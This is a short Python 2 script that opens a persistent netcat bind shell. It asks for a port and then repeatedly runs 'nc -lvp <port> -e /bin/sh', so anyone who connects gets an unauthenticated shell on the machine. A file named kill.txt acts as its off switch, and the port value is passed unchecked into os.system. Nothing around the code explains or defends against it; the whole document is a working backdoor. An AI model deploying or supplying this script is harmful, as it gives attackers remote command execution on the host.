#!/usr/bin/python

import os
import os.path

kill = 'kill.txt'
port = raw_input('LPORT : ')

def listener():
	f= open("kill.txt","r")
	str = f.readline();
	if 'yes' in str:
		f.close()
		exit()
	else:
		f.close()
		global port
		os.system('nc -lvp ' + port + ' -e /bin/sh')

while os.path.isfile(kill):
	listener()
else:
	exit()
